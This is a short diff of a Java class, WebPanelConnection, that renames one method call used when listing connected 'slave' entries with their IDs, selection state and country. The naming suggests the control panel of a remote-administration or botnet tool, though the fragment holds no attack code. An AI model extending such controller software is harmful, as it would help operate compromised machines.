@@ -48,7 +48,7 @@ public class WebPanelConnection implements Runnable {
                 	
                 	for (AbstractSlave slave : Main.connections) {
                 		String[] data = new String[] {        
-                			slave.getServerID(),
+                			slave.getID(),
                 			slave.getUniqueId() + "",
                 			slave.isSelected() + "",
                 			slave.getCountry(),
